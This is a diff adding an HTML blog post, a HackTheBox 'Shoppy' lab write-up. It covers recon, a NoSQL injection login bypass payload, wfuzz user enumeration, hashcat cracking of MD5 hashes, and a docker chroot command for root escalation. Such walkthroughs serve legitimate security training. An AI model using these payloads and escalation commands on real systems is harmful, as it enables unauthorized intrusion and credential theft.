@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Shoppy HackTheBox</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Shoppy HackTheBox | Dennis Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Shoppy HackTheBox" />
+<meta name="author" content="Dennis" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="recon" />
+<meta property="og:description" content="recon" />
+<meta property="og:site_name" content="Dennis Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-09-29T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Shoppy HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Dennis","url":"https://www.github.com/DennisFeldbusch"},"dateModified":"2022-09-29T00:00:00+00:00","datePublished":"2022-09-29T00:00:00+00:00","description":"recon","headline":"Shoppy HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"/Shoppy"},"url":"/Shoppy"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>dennis@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+<!-- HTML search field -->
+<div id="search-container">
+<input type="text" id="search-input" placeholder="Type your search here...">
+<ul id="results-container"></ul>
+</div>
+
+<!-- Grab search-script.js -->
+<script src="/assets/js/search-script.js" type="text/javascript"></script>
+
+<!-- Configuration -->
+<script>
+SimpleJekyllSearch({
+  searchInput: document.getElementById('search-input'),
+  resultsContainer: document.getElementById('results-container'),
+  json: '/search.json',
+  searchResultTemplate: '<li><a href="{url}">{title}</a><br><span class="post-meta">{date}</span></li>'
+})
+</script>
+
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Shoppy HackTheBox</h2>
+  <time datetime="2022-09-29T00:00:00+00:00" class="by-line">29 Sep 2022</time>
+  <h2 id="recon">recon</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -Ao nmap 10.10.11.180
+
+# Nmap 7.92 scan initiated Thu Sep 29 08:59:36 2022 as: nmap -sC -sV -Ao nmap.again 10.10.11.180
+Nmap scan report for 10.10.11.180
+Host is up (0.019s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
+|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
+|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
+80/tcp open  http    nginx 1.23.1
+|_http-server-header: nginx/1.23.1
+|_http-title: Did not follow redirect to http://shoppy.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Sep 29 09:00:05 2022 -- 1 IP address (1 host up) scanned in 29.38 seconds
+</code></pre></div></div>
+
+<h2 id="open-ports">open ports</h2>
+
+<ul>
+  <li>22 = ssh</li>
+  <li>80 = nginx http</li>
+</ul>
+
+<h2 id="enumerating-directories-and-subdomains">enumerating directories and subdomains</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># find directories</span>
+gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://shoppy.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+
+<span class="c"># find subdomains</span>
+gobuster dns <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/namelist.txt <span class="nt">-t</span> 50 <span class="nt">-d</span> shoppy.htb
+</code></pre></div></div>
+
+<p>These scans reveals that there is a login page under <code class="language-plaintext highlighter-rouge">shoppy.htb/login</code> and asubdomain <code class="language-plaintext highlighter-rouge">mattermost</code></p>
+
+<h2 id="nosql-injection">nosql injection</h2>
+
+<p>The login site is vulnerable to nosql injection which can be exploited when submitting <code class="language-plaintext highlighter-rouge">admin'||'1==1</code> as username.</p>
+
+<p>By logging in we can search for users and get the hashed password. 
+We now the user <code class="language-plaintext highlighter-rouge">admin</code> exists because we used his username in the nosql injection so we know how a positive search result looks like.</p>
+
+<p>With this information we can look for other users with <code class="language-plaintext highlighter-rouge">wfuzz</code></p>
+
+<h2 id="get-users-with-wfuzz">get users with wfuzz</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Usernames/Names/names.txt <span class="nt">-L</span> <span class="nt">--hh</span> 2561 <span class="nt">--hc</span> 500 <span class="nt">-b</span> <span class="s2">"Cookie: rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FU2e5ivWS313EqHejrDqmqWBOz%2B7JiK1ZGG8%2F1YJwbMqu75MRDE0GU; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FUY9maqReUKFXmGrrT34nxbATStnx0je7zCF90BWcHFlQ0UyMBoDkHwtnp1WJHOC9wgPADeoHzXw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX18zrc11pNHh3MGWXwjk8h1haEPxMCFoUas%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BvmEdwpOw3wnRMj5AHU%2BCwhP1yuW80jog%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX18s9pN%2BNQ675PZeUnKOiPXIxXeioQcUDB8%3D; connect.sid=s%3A9xH10SZ2ZaAI3nOvgVp8GSxULBvnaDUp.e%2BkKff%2B%2BDrQhWq5D35SR4qy4jYNJraJLAzGmS9ByjEw"</span> http://shoppy.htb/admin/search-users<span class="se">\?</span>username<span class="se">\=</span>FUZZ
+</code></pre></div></div>
+
+<p>Important here is to follow the request with the <code class="language-plaintext highlighter-rouge">-L</code> argument and to give it the header value with the <code class="language-plaintext highlighter-rouge">-b</code> argument. 
+I was struggeling a bit with it because it always returned the same results until I tried it with curl and recognized that the request needs the cookie to success.</p>
+
+<p>When using right the resulting users are <code class="language-plaintext highlighter-rouge">admin</code> which we already knew and <code class="language-plaintext highlighter-rouge">josh</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000086:   200        55 L     160 W      2720 Ch     "admin"
+000004909:   200        55 L     160 W      2720 Ch     "josh"
+</code></pre></div></div>
+
+<p>When clicking on “Download Export” we get an <code class="language-plaintext highlighter-rouge">id</code>, <code class="language-plaintext highlighter-rouge">username</code> and a hashed <code class="language-plaintext highlighter-rouge">password</code>.
+By looking at the length of the hashed password we can recognize that it is 32 chars long which can be a indication for the weak md5 hashing alogorithm.</p>
+
+<h2 id="cracking-found-passwords">cracking found passwords</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> we have to store the two hashes from <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">josh</code> in a file <code class="language-plaintext highlighter-rouge">hash.txt</code>
+By runnig <code class="language-plaintext highlighter-rouge">hashcat hash.txt</code> we can determine what kind of hash it could be and so make sure that the md5 assumption is right. 
+To crack the passwords run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 0 <span class="nt">--show</span> hash.txt rockyou.txt
+</code></pre></div></div>
+
+<h2 id="getting-user-level">getting user level</h2>
+
+<p>So we get the password for <code class="language-plaintext highlighter-rouge">josh</code> which we can use for the subdomain <code class="language-plaintext highlighter-rouge">mattermost</code>.Here we can login as <code class="language-plaintext highlighter-rouge">josh</code> and by looking around there are credentials for <code class="language-plaintext highlighter-rouge">jaeger</code> which we can use to <code class="language-plaintext highlighter-rouge">ssh</code> into the box and get the <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+
+<h2 id="privilege-escalation">privilege escalation</h2>
+
+<p>By running <code class="language-plaintext highlighter-rouge">sudo -l</code> we can examine which commands the user can execute.<br />
+We find the executable <code class="language-plaintext highlighter-rouge">/home/deploy/password-manager</code> which we can run as the <code class="language-plaintext highlighter-rouge">deploy</code> user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager<span class="sb">`</span>
+</code></pre></div></div>
+
+<p>We are asked about a master password which we can reverse engineer.</p>
+
+<h2 id="reverse-engineering-master-password">reverse engineering master password</h2>
+
+<p>By copying the executable to the loacl maschine we can inspect it with the tools we are familiar with. 
+First I tried to get the strings in it to look if the password where used in clear text in the source code.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings password-manager
+</code></pre></div></div>
+<p>Unfortunately no success with it.</p>
+
+<p>To continue we can use radare2 to get more information about the executable.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r2 password-manager
+aaa
+s main 
+VV
+</code></pre></div></div>
+
+<p>In the now presented callflow we can find a string <code class="language-plaintext highlighter-rouge">Sample</code>.</p>
+
+<p>So we can authenticate in the password-manager with this master password and we get the credentials for the deploy user.</p>
+
+<p>We can now login as <code class="language-plaintext highlighter-rouge">deploy</code> by executing <code class="language-plaintext highlighter-rouge">su deploy</code></p>
+
+<h2 id="getting-root">getting root</h2>
+
+<p>Still no permissions to access <code class="language-plaintext highlighter-rouge">/root</code> so we have to continue…</p>
+
+<p>By looking around be can find out that we can docker without super user rights.
+So we look for docker in GTFOBins to bypass security restrictions and find <a href="https://gtfobins.github.io/gtfobins/docker/">this</a>.</p>
+
+<p>To become <code class="language-plaintext highlighter-rouge">root</code> we run the command explained at the bottom of the site.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt sh
+</code></pre></div></div>
+
+<p>Voila. We are root</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Dennis</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
